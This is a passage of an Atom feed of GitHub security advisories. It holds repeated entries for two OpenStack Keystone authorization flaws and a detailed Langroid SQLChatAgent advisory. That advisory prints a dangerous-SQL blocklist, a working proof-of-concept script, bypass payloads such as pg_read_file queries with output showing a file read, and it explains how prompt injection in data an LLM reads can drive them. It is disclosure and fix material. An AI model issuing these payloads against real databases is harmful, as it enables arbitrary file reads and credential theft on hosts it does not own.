<li><a href="https://github.com/advisories/GHSA-2r23-2g6v-2m5f">https://github.com/advisories/GHSA-2r23-2g6v-2m5f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2r23-2g6v-2m5f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone has an Authorization Bypass]]></title>
        <id>https://github.com/advisories/GHSA-2r23-2g6v-2m5f</id>
        <link href="https://github.com/advisories/GHSA-2r23-2g6v-2m5f"/>
        <updated>2026-07-02T17:44:06.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone RBAC policy enforcer in enforce_call unconditionally merges the raw JSON request body into the policy enforcement dictionary via policy_dict.update(json_input.copy()), overwriting trusted target data that was previously set from database lookups. Because flask.request.get_json is called with force=True, this works regardless of Content-Type or HTTP method. Any authenticated user can inject arbitrary policy target attributes (e.g., user_id, project_id) into the request body to bypass RBAC checks and perform unauthorized operations on resources belonging to other users or projects. This was introduced in commit 5ea59f52 (Rocky/14.0.0).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42999">https://nvd.nist.gov/vuln/detail/CVE-2026-42999</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148398">https://bugs.launchpad.net/keystone/+bug/2148398</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-42999">https://access.redhat.com/security/cve/CVE-2026-42999</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2482840">https://bugzilla.redhat.com/show_bug.cgi?id=2482840</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42999.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42999.json</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-600.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-600.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-2r23-2g6v-2m5f">https://github.com/advisories/GHSA-2r23-2g6v-2m5f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2r23-2g6v-2m5f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone has an Authorization Bypass]]></title>
        <id>https://github.com/advisories/GHSA-2r23-2g6v-2m5f</id>
        <link href="https://github.com/advisories/GHSA-2r23-2g6v-2m5f"/>
        <updated>2026-07-02T17:44:06.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone RBAC policy enforcer in enforce_call unconditionally merges the raw JSON request body into the policy enforcement dictionary via policy_dict.update(json_input.copy()), overwriting trusted target data that was previously set from database lookups. Because flask.request.get_json is called with force=True, this works regardless of Content-Type or HTTP method. Any authenticated user can inject arbitrary policy target attributes (e.g., user_id, project_id) into the request body to bypass RBAC checks and perform unauthorized operations on resources belonging to other users or projects. This was introduced in commit 5ea59f52 (Rocky/14.0.0).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42999">https://nvd.nist.gov/vuln/detail/CVE-2026-42999</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148398">https://bugs.launchpad.net/keystone/+bug/2148398</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-42999">https://access.redhat.com/security/cve/CVE-2026-42999</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2482840">https://bugzilla.redhat.com/show_bug.cgi?id=2482840</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42999.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42999.json</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-600.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-600.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-2r23-2g6v-2m5f">https://github.com/advisories/GHSA-2r23-2g6v-2m5f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2r23-2g6v-2m5f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone doesn't verify that the user supplied in the authentication request matches the owner of the application credential]]></title>
        <id>https://github.com/advisories/GHSA-8f8m-wrvr-wcvf</id>
        <link href="https://github.com/advisories/GHSA-8f8m-wrvr-wcvf"/>
        <updated>2026-07-02T17:43:21.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone application credential authentication plugin does not verify that the user supplied in the authentication request matches the owner of the application credential. An attacker can authenticate with their own application credential ID and secret while specifying a different user's name and domain in the request body. Keystone issues a token attributed to the victim user. The impersonated token is project-scoped and carries the intersection of the application credential's roles and the victim's actual roles on the project. This enables audit evasion, reading the victim's credentials, and acting as the victim within shared projects.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42998">https://nvd.nist.gov/vuln/detail/CVE-2026-42998</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148477">https://bugs.launchpad.net/keystone/+bug/2148477</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-599.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-599.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-8f8m-wrvr-wcvf">https://github.com/advisories/GHSA-8f8m-wrvr-wcvf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8f8m-wrvr-wcvf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone doesn't verify that the user supplied in the authentication request matches the owner of the application credential]]></title>
        <id>https://github.com/advisories/GHSA-8f8m-wrvr-wcvf</id>
        <link href="https://github.com/advisories/GHSA-8f8m-wrvr-wcvf"/>
        <updated>2026-07-02T17:43:21.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone application credential authentication plugin does not verify that the user supplied in the authentication request matches the owner of the application credential. An attacker can authenticate with their own application credential ID and secret while specifying a different user's name and domain in the request body. Keystone issues a token attributed to the victim user. The impersonated token is project-scoped and carries the intersection of the application credential's roles and the victim's actual roles on the project. This enables audit evasion, reading the victim's credentials, and acting as the victim within shared projects.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42998">https://nvd.nist.gov/vuln/detail/CVE-2026-42998</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148477">https://bugs.launchpad.net/keystone/+bug/2148477</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-599.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-599.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-8f8m-wrvr-wcvf">https://github.com/advisories/GHSA-8f8m-wrvr-wcvf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8f8m-wrvr-wcvf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone doesn't verify that the user supplied in the authentication request matches the owner of the application credential]]></title>
        <id>https://github.com/advisories/GHSA-8f8m-wrvr-wcvf</id>
        <link href="https://github.com/advisories/GHSA-8f8m-wrvr-wcvf"/>
        <updated>2026-07-02T17:43:21.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone application credential authentication plugin does not verify that the user supplied in the authentication request matches the owner of the application credential. An attacker can authenticate with their own application credential ID and secret while specifying a different user's name and domain in the request body. Keystone issues a token attributed to the victim user. The impersonated token is project-scoped and carries the intersection of the application credential's roles and the victim's actual roles on the project. This enables audit evasion, reading the victim's credentials, and acting as the victim within shared projects.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42998">https://nvd.nist.gov/vuln/detail/CVE-2026-42998</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148477">https://bugs.launchpad.net/keystone/+bug/2148477</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-599.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-599.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-8f8m-wrvr-wcvf">https://github.com/advisories/GHSA-8f8m-wrvr-wcvf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8f8m-wrvr-wcvf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langroid] Langroid: SQLChatAgent _validate_query blocklist misses pg_read_file family enabling arbitrary file read]]></title>
        <id>https://github.com/advisories/GHSA-pmch-g965-grmr</id>
        <link href="https://github.com/advisories/GHSA-pmch-g965-grmr"/>
        <updated>2026-07-02T17:42:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>SQLChatAgent</code> in <code>langroid</code> ships a <code>_validate_query</code> defense-in-depth layer
whose <code>_DANGEROUS_SQL_PATTERNS</code> regex blocklist enumerates dangerous SQL
primitives by specific function name. The list misses the canonical
PostgreSQL filesystem-disclosure family <code>pg_read_file()</code>, <code>pg_stat_file()</code>,
<code>pg_ls_logdir()</code>, <code>pg_ls_waldir()</code>, <code>pg_current_logfile()</code> (and similar
<code>SELECT</code>-shaped functions in the same family). It also leaves SQL Server
<code>OPENDATASOURCE</code> and SQLite <code>ATTACH '&lt;file&gt;' AS x</code> (DATABASE keyword
omitted) unblocked.</p>
<p>An attacker able to shape the LLM's generated SQL (directly via prompt input
or transitively via prompt-injection in data the LLM ingests) can read
arbitrary files from the PostgreSQL host through ordinary <code>SELECT</code> queries,
even with the agent's strict default configuration
(<code>allow_dangerous_operations=False</code>, <code>allowed_statement_types=['SELECT']</code>).
The payloads survive the statement-type allowlist (each is a <code>SELECT</code>) and
pass through the regex blocklist (none of the function names match), then
reach the live SQLAlchemy engine via <code>SQLChatAgent.run_query</code>.</p>
<h3 id="affected-versions">Affected versions</h3>
<p><code>langroid</code> <code>&lt;= 0.63.0</code> (latest at the time of this report; PyPI release
2026-05-27). The vulnerable code path is
<code>langroid/agent/special/sql/sql_chat_agent.py::_validate_query</code>, which
consults the module-level <code>_DANGEROUS_SQL_PATTERNS</code> literal at
<code>sql_chat_agent.py:113-141</code>.</p>
<h3 id="privilege-required">Privilege required</h3>
<p>Any caller able to influence the LLM-generated <code>RunQueryTool.query</code> string
that reaches <code>SQLChatAgent.run_query</code>. In a typical deployment this is any
client of a SQLChatAgent-backed service, or any upstream data source whose
content the LLM is asked to read and summarise. No PostgreSQL credentials
are required from the attacker; the agent holds them.</p>
<h3 id="vulnerable-code">Vulnerable code</h3>
<p><code>langroid/agent/special/sql/sql_chat_agent.py:113-141</code> (the
<code>_DANGEROUS_SQL_PATTERNS</code> literal) and <code>sql_chat_agent.py:546-615</code> (the
<code>_validate_query</code> method that consults it):</p>
<pre><code class="language-python"># sql_chat_agent.py:113
_DANGEROUS_SQL_PATTERNS: List["re.Pattern[str]"] = [
    re.compile(r"\bcopy\b[\s\S]*\bprogram\b", re.IGNORECASE),
    re.compile(r"\bpg_read_server_files?\b", re.IGNORECASE),
    re.compile(r"\bpg_read_binary_file\b", re.IGNORECASE),
    re.compile(r"\bpg_ls_dir\b", re.IGNORECASE),
    re.compile(r"\blo_(import|export)\b", re.IGNORECASE),
    re.compile(r"\binto\s+(outfile|dumpfile)\b", re.IGNORECASE),
    re.compile(r"\bload_file\s*\(", re.IGNORECASE),
    re.compile(r"\bload\s+data\b", re.IGNORECASE),
    re.compile(r"\bload_extension\s*\(", re.IGNORECASE),
    re.compile(r"\battach\s+database\b", re.IGNORECASE),
    re.compile(r"\bxp_cmdshell\b", re.IGNORECASE),
    re.compile(r"\bsp_oacreate\b", re.IGNORECASE),
    re.compile(r"\bsp_oamethod\b", re.IGNORECASE),
    re.compile(r"\bopenrowset\b", re.IGNORECASE),
    re.compile(r"\bbulk\s+insert\b", re.IGNORECASE),
    re.compile(
        r"\bcreate\s+(or\s+replace\s+)?(function|procedure|trigger)\b",
        re.IGNORECASE,
    ),
    re.compile(r"\bcreate\s+extension\b", re.IGNORECASE),
]
</code></pre>
<p>The blocklist is a list of <code>\b&lt;exact-token&gt;\b</code> literals. PostgreSQL ships
several near-name functions on the same primitive that none of these match:</p>
<table>
<thead>
<tr>
<th>Function</th>
<th>What it returns</th>
<th>Matched by blocklist?</th>
</tr>
</thead>
<tbody><tr>
<td><code>pg_read_server_file('/path')</code></td>
<td>file contents</td>
<td>yes (<code>pg_read_server_files?</code>)</td>
</tr>
<tr>
<td><code>pg_read_binary_file('/path')</code></td>
<td>binary contents</td>
<td>yes</td>
</tr>
<tr>
<td><code>pg_ls_dir('/path')</code></td>
<td>directory listing</td>
<td>yes</td>
</tr>
<tr>
<td><code>pg_read_file('/path')</code></td>
<td>file contents</td>
<td><strong>no</strong> (no <code>_server_</code> infix)</td>
</tr>
<tr>
<td><code>pg_stat_file('/path')</code></td>
<td>size, mtime, ctime, atime, isdir</td>
<td><strong>no</strong></td>
</tr>
<tr>
<td><code>pg_ls_logdir()</code></td>
<td>filenames in PostgreSQL log dir</td>
<td><strong>no</strong></td>
</tr>
<tr>
<td><code>pg_ls_waldir()</code></td>
<td>WAL filenames and sizes</td>
<td><strong>no</strong></td>
</tr>
<tr>
<td><code>pg_ls_tmpdir()</code></td>
<td>temp-dir listing</td>
<td><strong>no</strong></td>
</tr>
<tr>
<td><code>pg_ls_archive_statusdir()</code></td>
<td>archive-status directory listing</td>
<td><strong>no</strong></td>
</tr>
<tr>
<td><code>pg_current_logfile()</code></td>
<td>active server log path</td>
<td><strong>no</strong></td>
</tr>
</tbody></table>
<p>Each of these is a <code>SELECT</code>-shaped function call. They pass the
<code>sqlglot_exp.Select</code>-only statement-type allowlist applied at
<code>sql_chat_agent.py:583-614</code>, then evade the regex blocklist (their names
contain no token the blocklist enumerates), then reach the SQLAlchemy
<code>session.execute(text(query))</code> sink inside <code>SQLChatAgent.run_query</code> (line
631 onwards).</p>
<p>Two non-PostgreSQL secondary gaps with the same regex-enumeration shape:</p>
<ul>
<li>The SQLite pattern <code>\battach\s+database\b</code> requires the literal
<code>DATABASE</code> keyword. Per the SQLite grammar
(<a href="https://www.sqlite.org/lang_attach.html">https://www.sqlite.org/lang_attach.html</a>) the keyword is optional:
<code>ATTACH '/path/to/db' AS x</code> is valid syntax and matches no entry in the
blocklist. Whether the agent rejects this via the statement-type
allowlist depends on how the configured <code>sqlglot</code> dialect parses it; on
PostgreSQL dialect parsing fails (sqlglot returns no <code>Select</code>) and the
statement-type check rejects, but a SQLite-dialect SQLChatAgent
(<code>database_uri="sqlite:///..."</code>) returns the statement as
<code>sqlglot_exp.Attach</code>, which is not in the agent's <code>kind_map</code>, so the
generic <code>type(stmt).__name__.upper()</code> branch produces <code>"ATTACH"</code>. That
string is not in <code>_DEFAULT_ALLOWED_STATEMENTS</code> so the allowlist saves it
here; however any deployment that extends <code>allowed_statement_types</code> to
include <code>"ATTACH"</code> (e.g. to permit cross-schema connectivity) loses
this fallback and the regex misses.</li>
<li>The MSSQL pattern <code>\bopenrowset\b</code> blocks <code>OPENROWSET</code> but not the
closely-related <code>OPENDATASOURCE</code> function. Both can read
remote/UNC files and execute remote queries via an ad-hoc connection
string, e.g. a <code>SELECT</code> against
<code>OPENDATASOURCE('SQLNCLI11','Server=remote;Trusted_Connection=yes')</code>
qualified down to <code>master.sys.tables</code>.</li>
</ul>
<h3 id="attack-scenario">Attack scenario</h3>
<p><code>SQLChatAgent.run_query</code> (line 617 of <code>sql_chat_agent.py</code>) calls
<code>self._validate_query(query)</code> (line 631) on the LLM-generated SQL. The
LLM-generated SQL is shaped by upstream prompt content that crosses the
trust boundary: the user message, any tool result the LLM is asked to
summarise, any document the agent retrieves, and any row the agent reads
back from its own database (the <code>RunQueryTool</code> result is fed back into the
LLM history at <code>sql_chat_agent.py:712-720</code> of the same release).</p>
<p>The default config in <code>SQLChatAgentConfig</code> (lines 183-184) sets
<code>allow_dangerous_operations=False</code> and <code>allowed_statement_types=["SELECT"]</code>,
which is the configuration <code>_validate_query</code> was added to support. The
bypass primitives below are reachable under this default config because
each is a syntactic <code>SELECT</code> whose function-call argument is the
disclosure vector.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p><code>poc.py</code> (single-file, no external services beyond a transient PostgreSQL
spawned via <code>testing.postgresql</code>):</p>
<pre><code class="language-python">"""
PoC: SQLChatAgent _validate_query bypass via PostgreSQL file-disclosure
family pg_read_file / pg_stat_file / pg_ls_logdir / pg_ls_waldir /
pg_current_logfile.
"""

import os
import re
import sys
from typing import List, Optional

PKG = "/tmp/poc-langroid-bypass/venv/lib/python3.12/site-packages/langroid"
SRC = f"{PKG}/agent/special/sql/sql_chat_agent.py"
assert os.path.exists(SRC), f"Missing pinned langroid source: {SRC}"

import sqlglot
from sqlglot import expressions as sqlglot_exp


def load_patterns_from_pinned_source():
    """Extract _DANGEROUS_SQL_PATTERNS + _DEFAULT_ALLOWED_STATEMENTS from
    the pinned langroid 0.63.0 sql_chat_agent.py without instantiating the
    full agent stack (which needs an LLM config)."""
    with open(SRC) as f:
        source = f.read()
    block = re.search(
        r"_DANGEROUS_SQL_PATTERNS:[^=]*=\s*\[(.*?)\]\s*\n", source, re.DOTALL,
    )
    ns = {"re": re, "List": list}
    patterns = eval("[" + block.group(1) + "]", ns)
    allowed = eval(
        re.search(
            r"_DEFAULT_ALLOWED_STATEMENTS:\s*List\[str\]\s*=\s*(\[.*?\])",
            source, re.DOTALL,
        ).group(1)
    )
    return patterns, allowed


def validate_query(query, patterns, allowed_statements, dialect="postgres"):
    """Faithful reimplementation of SQLChatAgent._validate_query."""
    for pat in patterns:
        if pat.search(query):
            return f"Rejected by pattern {pat.pattern!r}"
    allowed = {t.strip().upper() for t in allowed_statements}
    try:
        statements = sqlglot.parse(query, read=dialect)
    except Exception as e:
        return f"Rejected: sqlglot parse failure: {e}"
    kind_map = {
        sqlglot_exp.Select: "SELECT", sqlglot_exp.Insert: "INSERT",
        sqlglot_exp.Update: "UPDATE", sqlglot_exp.Delete: "DELETE",
        sqlglot_exp.Merge: "MERGE", sqlglot_exp.Create: "CREATE",
        sqlglot_exp.Drop: "DROP", sqlglot_exp.Alter: "ALTER",
        sqlglot_exp.TruncateTable: "TRUNCATE", sqlglot_exp.Command: "COMMAND",
    }
    for stmt in statements:
        if stmt is None:
            continue
        kind = next(
            (v for k, v in kind_map.items() if isinstance(stmt, k)),
            type(stmt).__name__.upper(),
        )
        if kind not in allowed:
            return f"Rejected: statement type {kind!r} not in allowed {sorted(allowed)}"
    return None


def main():
    patched_patterns, allowed_statements = load_patterns_from_pinned_source()
    print(f"_DANGEROUS_SQL_PATTERNS count: {len(patched_patterns)}")
    print(f"_DEFAULT_ALLOWED_STATEMENTS:   {allowed_statements}")

    import testing.postgresql
    from sqlalchemy import create_engine, text

    pg = testing.postgresql.Postgresql()
    db_uri = pg.url()
    engine = create_engine(db_uri)
    with engine.connect() as conn:
        pgdata = conn.execute(text("SHOW data_directory")).scalar()
    victim_rel = "langroid_bypass_victim.txt"
    victim_abs = os.path.join(pgdata, victim_rel)
    with open(victim_abs, "w") as f:
        f.write("PWNED_BY_LANGROID_VALIDATOR_BYPASS\n")
    print(f"=== Victim file at: {victim_abs}")

    bypass_payloads = [
        ("bypass.pg_read_file", f"SELECT pg_read_file('{victim_rel}')"),
        ("bypass.pg_stat_file", f"SELECT pg_stat_file('{victim_rel}')"),
        ("bypass.pg_ls_logdir", "SELECT pg_ls_logdir()"),
        ("bypass.pg_ls_waldir", "SELECT pg_ls_waldir()"),
        ("bypass.pg_current_logfile", "SELECT pg_current_logfile()"),
    ]

    for label, query in bypass_payloads:
        rej = validate_query(query, patched_patterns, allowed_statements, "postgres")
        verdict = "REJECTED" if rej is not None else "ALLOWED"
        print(f"  [{verdict}] {label}: {query}")
        if verdict == "ALLOWED":
            try:
                with engine.connect() as conn:
                    rows = conn.execute(text(query)).fetchall()
                preview = [tuple(str(c)[:80] for c in r) for r in rows[:2]]
                print(f"     -&gt; live engine returned rows={len(rows)} preview={preview}")
            except Exception as e:
                print(f"     -&gt; live engine error: {type(e).__name__}: {str(e)[:120]}")


if __name__ == "__main__":
    main()
</code></pre>
<h3 id="end-to-end-reproduction">End-to-end reproduction</h3>
<p>Run against the latest published <code>langroid</code> release from PyPI; no external
LLM provider, no API key, no Docker, just a transient <code>pg_ctl</code>-managed
PostgreSQL spawned in-process by <code>testing.postgresql</code>. Captured transcript
of the run is below.</p>
<pre><code class="language-bash"># 1. Pin install the latest published release
python3.12 -m venv /tmp/poc-langroid-bypass/venv
source /tmp/poc-langroid-bypass/venv/bin/activate
pip install 'langroid==0.63.0' 'testing.postgresql' 'sqlglot' 'sqlalchemy&lt;2.1'

# 2. Drop poc.py from the Proof-of-concept section above into
#    /tmp/poc-langroid-bypass/poc.py and run it
python /tmp/poc-langroid-bypass/poc.py
</code></pre>
<p>Observed transcript (abridged to bypass results; the run also verifies
that the four primitives the current blocklist already covers
(<code>COPY ... TO PROGRAM</code>, <code>pg_read_server_file</code>, <code>pg_read_binary_file</code>,
<code>pg_ls_dir</code>) continue to be REJECTED, confirming the proposed fix is
strictly broader, not narrower):</p>
<pre><code class="language-text">_DANGEROUS_SQL_PATTERNS count: 17
_DEFAULT_ALLOWED_STATEMENTS:   ['SELECT']
=== Transient PostgreSQL: postgresql://postgres@127.0.0.1:64694/test
=== Victim file at: /var/folders/.../tmpwuftmtu4/data/langroid_bypass_victim.txt

PATCHED VALIDATOR RESULTS (langroid 0.63.0 as shipped)
  [ALLOWED]  bypass.pg_read_file        SELECT pg_read_file('langroid_bypass_victim.txt')
  [ALLOWED]  bypass.pg_stat_file        SELECT pg_stat_file('langroid_bypass_victim.txt')
  [ALLOWED]  bypass.pg_ls_logdir        SELECT pg_ls_logdir()
  [ALLOWED]  bypass.pg_ls_waldir        SELECT pg_ls_waldir()
  [ALLOWED]  bypass.pg_current_logfile  SELECT pg_current_logfile()

LIVE EXECUTION OF BYPASS PAYLOADS (postgres only)
  [EXECUTED] bypass.pg_read_file        -&gt; rows=1 preview=[('PWNED_BY_LANGROID_VALIDATOR_BYPASS\n',)]
  [EXECUTED] bypass.pg_stat_file        -&gt; rows=1 preview=[('(35,"2026-05-28 10:11:19+08","2026-05-28 10:11:19+08","2026-05-28 10:11:19+08",,',)]
  [EXECUTED] bypass.pg_ls_waldir        -&gt; rows=1 preview=[('(000000010000000000000001,16777216,"2026-05-28 10:11:19+08")',)]
  [EXECUTED] bypass.pg_current_logfile  -&gt; rows=1 preview=[('None',)]

NEGATIVE CONTROL — SUGGESTED FIX VALIDATOR
  [REJECTED] bypass.pg_read_file        -&gt; OK
  [REJECTED] bypass.pg_stat_file        -&gt; OK
  [REJECTED] bypass.pg_ls_logdir        -&gt; OK
  [REJECTED] bypass.pg_ls_waldir        -&gt; OK
  [REJECTED] bypass.pg_current_logfile  -&gt; OK
  [REJECTED] already_blocked.copy_program        -&gt; OK
  [REJECTED] already_blocked.pg_read_server_file -&gt; OK
  [REJECTED] already_blocked.pg_read_binary_file -&gt; OK
  [REJECTED] already_blocked.pg_ls_dir           -&gt; OK
</code></pre>
<p>The headline payload <code>SELECT pg_read_file('langroid_bypass_victim.txt')</code>
returns the marker string verbatim from the file on disk. The same SQL,
issued by an LLM under prompt-injection through any data source the agent
reads, would land identically — the validator is purely a function of the
SQL string and is consulted before the SQLAlchemy execute.</p>
<p><code>_validate_query</code> is invoked directly rather than through a fully
initialised <code>SQLChatAgent</code> because the agent's <code>__init__</code> builds the LLM
stack and demands a working LLM API key (or a stub). The security
control under test is purely a function of <code>(query, patterns, allowed_statements, dialect)</code>, so the direct call is observationally
equivalent to a call via <code>run_query</code>. Patterns and allowed-statements are
loaded by reading the pinned <code>sql_chat_agent.py</code> source out of the venv,
guaranteeing no drift between PoC and shipped binary.</p>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Arbitrary file read</strong> from the PostgreSQL host: <code>pg_read_file()</code> reads
files from PGDATA-relative paths by default and can take absolute paths
when the DB role holds <code>pg_read_server_files</code> (or equivalent in
managed-Postgres setups). For self-managed PostgreSQL deployments the
DB role is frequently a superuser, in which case absolute paths are
always accepted and the impact extends to <code>postgresql.conf</code>,
<code>pg_hba.conf</code>, <code>~/.pgpass</code>, TLS keys, and any other file readable by
the PostgreSQL OS user.</li>
<li><strong>Filesystem reconnaissance</strong> via <code>pg_stat_file()</code> (file existence,
size, mtime, isdir), <code>pg_ls_logdir()</code>, <code>pg_ls_waldir()</code>,
<code>pg_ls_tmpdir()</code>, <code>pg_ls_archive_statusdir()</code>,
<code>pg_current_logfile()</code>.</li>
<li><strong>MSSQL extension:</strong> <code>OPENDATASOURCE</code> reaches remote SQL Servers and
UNC paths, providing arbitrary outbound read + intranet pivot on MSSQL
deployments.</li>
<li><strong>SQLite extension:</strong> <code>ATTACH '&lt;path&gt;' AS schemaname</code> (DATABASE keyword
omitted) allows reading/writing arbitrary SQLite files on deployments
whose <code>allowed_statement_types</code> include <code>"ATTACH"</code>.</li>
</ul>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Patch <code>_DANGEROUS_SQL_PATTERNS</code> to cover the full family rather than
individual function names. Two compatible approaches; either is enough.</p>
<p>Approach 1 — family-prefix regex (minimal change, simplest to review):</p>
<pre><code class="language-python">_DANGEROUS_SQL_PATTERNS: List["re.Pattern[str]"] = [
    re.compile(r"\bcopy\b[\s\S]*\bprogram\b", re.IGNORECASE),
    # Block the whole pg_read_*, pg_stat_*, pg_ls_*, pg_current_logfile
    # family. Covers pg_read_file, pg_read_server_file(s),
    # pg_read_binary_file, pg_stat_file, pg_ls_logdir, pg_ls_waldir,
    # pg_ls_tmpdir, pg_ls_archive_statusdir, pg_ls_dir,
    # pg_current_logfile, plus any future siblings PostgreSQL adds.
    re.compile(
        r"\bpg_(read|stat|ls|current_logfile)[A-Za-z0-9_]*\s*\(",
        re.IGNORECASE,
    ),
    re.compile(r"\blo_(import|export)\b", re.IGNORECASE),
    re.compile(r"\binto\s+(outfile|dumpfile)\b", re.IGNORECASE),
    re.compile(r"\bload_file\s*\(", re.IGNORECASE),
    re.compile(r"\bload\s+data\b", re.IGNORECASE),
    re.compile(r"\bload_extension\s*\(", re.IGNORECASE),
    # SQLite grammar: ATTACH [DATABASE] expr AS schema-name.
    # The DATABASE keyword is optional; match either form.
    re.compile(r"\battach\b(\s+database)?\s+['\"\w]", re.IGNORECASE),
    re.compile(r"\bxp_cmdshell\b", re.IGNORECASE),
    re.compile(r"\bsp_oacreate\b", re.IGNORECASE),
    re.compile(r"\bsp_oamethod\b", re.IGNORECASE),
    re.compile(r"\b(openrowset|opendatasource)\b", re.IGNORECASE),
    re.compile(r"\bbulk\s+insert\b", re.IGNORECASE),
    re.compile(
        r"\bcreate\s+(or\s+replace\s+)?(function|procedure|trigger|language|rule|event\s+trigger|foreign\s+table)\b",
        re.IGNORECASE,
    ),
    re.compile(r"\bcreate\s+extension\b", re.IGNORECASE),
]
</code></pre>
<p>Approach 2 — <code>sqlglot</code> AST walk in addition to regex. <code>sqlglot</code> is already
imported by <code>sql_chat_agent.py</code>; iterate every function-call node
(<code>sqlglot_exp.Anonymous</code> / <code>sqlglot_exp.Func</code>) inside the parsed
statements and reject when the lower-cased name starts with <code>pg_read</code>,
<code>pg_stat</code>, <code>pg_ls</code>, <code>pg_current_logfile</code>, <code>lo_</code>, or matches the MSSQL
extended-procedure prefixes (<code>xp_</code>, <code>sp_oa</code>). AST matching is robust to
whitespace, comments, and case games inside identifiers, at the cost of
broader per-dialect maintenance. For closing the immediate gap, Approach
1 is sufficient.</p>
<p>Regression-test the additions in
<code>tests/main/sql_chat/test_sql_chat_security.py</code> alongside the existing
